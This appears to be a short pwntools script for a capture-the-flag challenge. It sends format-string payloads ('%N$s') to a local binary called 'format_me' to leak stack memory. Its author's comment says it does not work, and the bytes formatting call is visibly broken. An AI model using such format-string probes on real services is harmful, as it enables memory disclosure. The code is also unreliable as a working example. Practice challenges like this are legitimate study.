#non funziona :D

from pwn import *

elf=ELF("format_me")

for i in range(25):
    try:
        r=elf.process()
        print("%{}$s".format(i))
        r.sendlineafter("Input your name:",b"%{}$s".format(i))
        r.recvuntil("Hello: ")
        print(r.recvline())
    except:
        r=elf.process()
        
